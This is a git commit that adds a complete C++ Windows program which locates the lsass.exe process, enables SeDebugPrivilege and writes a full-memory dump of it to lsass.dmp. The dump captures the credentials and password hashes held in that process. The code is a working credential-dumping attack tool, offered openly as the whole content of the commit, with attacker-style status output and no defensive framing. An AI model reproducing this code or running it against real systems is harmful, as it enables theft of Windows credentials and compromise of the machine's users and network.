feaa60f2769014a7532ba94214e9e8407d48cb5c
Mehran Toreihi <mtoreihi@gmail.com>
2019-05-16 15:00:30 +0430

    lsass_minidump added

---
+++ lsass_minidump/lsass_minidump/lsass_minidump.cpp
@@ -0,0 +1,95 @@
+/** Mehran Toreihi
+	mtoreihi@gmail.com
+	1398-02-26
+	2019-05-16
+ */
+
+#include <windows.h>
+#include <DbgHelp.h>
+#include <iostream>
+#include <TlHelp32.h>
+#include <strsafe.h>
+using namespace std;
+
+bool SetPrivilege(LPCWSTR lpszPrivilege, BOOL bEnablePrivilege) {
+	TOKEN_PRIVILEGES priv = { 0,0,0,0 };
+	HANDLE hToken = NULL;
+	LUID luid = { 0,0 };
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
+		if (hToken)
+			CloseHandle(hToken);
+		return false;
+	}
+	if (!LookupPrivilegeValueW(0, lpszPrivilege, &luid)) {
+		if (hToken)
+			CloseHandle(hToken);
+		return false;
+	}
+	priv.PrivilegeCount = 1;
+	priv.Privileges[0].Luid = luid;
+	priv.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;
+	if (!AdjustTokenPrivileges(hToken, false, &priv, 0, 0, 0)) {
+		if (hToken)
+			CloseHandle(hToken);
+		return false;
+	}
+	if (hToken)
+		CloseHandle(hToken);
+	return true;
+}
+
+int main() {
+	DWORD lsassPID = 0;
+	HANDLE lsassHandle = NULL;
+	HANDLE outFile = CreateFile(L"lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	PROCESSENTRY32 processEntry = {};
+	processEntry.dwSize = sizeof(PROCESSENTRY32);
+	LPCWSTR processName = L"";
+
+	if (Process32First(snapshot, &processEntry)) {
+		while (_wcsicmp(processName, L"lsass.exe") != 0) {
+			Process32Next(snapshot, &processEntry);
+			processName = processEntry.szExeFile;
+			lsassPID = processEntry.th32ProcessID;
+		}
+		wcout << "[+] Got lsass.exe PID: " << lsassPID << endl;
+	}
+
+	SetPrivilege(L"SeDebugPrivilege", TRUE);
+
+	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
+	BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
+
+	if (isDumped) {
+		cout << "[+] lsass dumped successfully!" << endl;
+	}
+	else {
+		cout << "[-] error generating dump!" << endl;
+		DWORD dw = GetLastError();
+		LPVOID lpMsgBuf;
+		LPVOID lpDisplayBuf;
+
+		FormatMessage(
+			FORMAT_MESSAGE_ALLOCATE_BUFFER |
+			FORMAT_MESSAGE_FROM_SYSTEM |
+			FORMAT_MESSAGE_IGNORE_INSERTS,
+			NULL,
+			dw,
+			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+			(LPTSTR)& lpMsgBuf,
+			0, NULL);
+
+		lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
+			(lstrlen((LPCTSTR)lpMsgBuf) + 40) * sizeof(TCHAR));
+
+		StringCchPrintf((LPTSTR)lpDisplayBuf,
+			LocalSize(lpDisplayBuf) / sizeof(TCHAR),
+			TEXT("%d: %s"),
+			dw, lpMsgBuf);
+		printf("Error: %ls\n", lpDisplayBuf);
+	}
+
+
+	return 0;
+}
